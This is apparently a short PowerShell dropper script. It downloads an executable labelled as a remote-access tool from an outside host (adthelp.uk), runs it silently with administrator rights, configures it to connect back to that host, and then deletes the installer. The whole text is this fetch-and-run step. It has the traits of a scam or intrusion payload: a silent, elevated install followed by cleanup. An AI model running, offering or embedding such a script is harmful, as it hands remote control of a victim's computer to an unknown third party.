$Path = $env:TEMP
$ExeName = "Remote Access-windows64-online.exe"
Invoke-WebRequest "https://adthelp.uk:443/app/66525376601571407113266824235861950235" -OutFile $Path\$ExeName
Start-Process -FilePath $Path\$ExeName -Args "/S /NAME=AUTODETECT /HOST=udp://adthelp.uk" -Verb RunAs -Wait
Remove-Item $Path\$ExeName